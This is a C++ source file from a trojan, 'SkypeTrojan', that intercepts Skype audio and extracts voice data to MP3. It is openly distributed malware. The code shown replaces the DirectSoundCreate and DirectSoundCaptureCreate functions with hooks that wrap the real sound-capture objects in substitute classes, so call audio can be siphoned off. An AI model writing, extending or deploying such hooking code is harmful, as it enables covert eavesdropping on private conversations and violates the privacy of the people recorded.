/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <windows.h>
#include <stdio.h>
#include <DSound.h>

#include "IDirectSoundCaptureReplacement.h"
#include "IDirectSoundReplacement.h"
#include "IDirectSoundBufferReplacement.h"
#include "iDirectSoundCaptureBufferReplacement.h"

extern byte* CG_directSoundCreate;
extern byte* CG_directSoundCaptureCreate;



/*
 * DirectSoundCreate()
 *
 */

HRESULT WINAPI MyDirectSoundCreate(LPGUID lpGuid, LPDIRECTSOUND *ppDS, LPUNKNOWN  pUnkOuter)
{
  MYDIRECTSOUNDCREATE fdirectSoundCreate = (MYDIRECTSOUNDCREATE) CG_directSoundCreate;
  FILE *mFH = NULL;
  HRESULT mRetVal = 0;

  if(!fdirectSoundCreate)
    return 0; //if function pointer is invalid...

  mRetVal = fdirectSoundCreate(lpGuid, ppDS, pUnkOuter);


  /*
   * Replace ppDS by our own one and remember where the real object 
   *
   */

  *ppDS = new IDirectSoundReplacement(*ppDS);

  return(mRetVal);
}






/*
 * DirectSoundCaptureCreate()
 *
 */

HRESULT WINAPI MyDirectSoundCaptureCreate(LPGUID lpGUID, LPDIRECTSOUNDCAPTURE *lplpDSC, LPUNKNOWN pUnkOuter)
{
  MYDIRECTSOUNDCAPTURECREATE fdirectSoundCaptureCreate = (MYDIRECTSOUNDCAPTURECREATE) CG_directSoundCaptureCreate;
  FILE *mFH = NULL;
  HRESULT mRetVal;


  if(!fdirectSoundCaptureCreate)
    return(0); //if function pointer is invalid...

  mRetVal = fdirectSoundCaptureCreate(lpGUID, lplpDSC, pUnkOuter);


  /*
   * Replace lplpDSC by our own one and remember where the real object lays
   *
   */

  *lplpDSC = new IDirectSoundCaptureReplacement(*lplpDSC);

  return(mRetVal);
}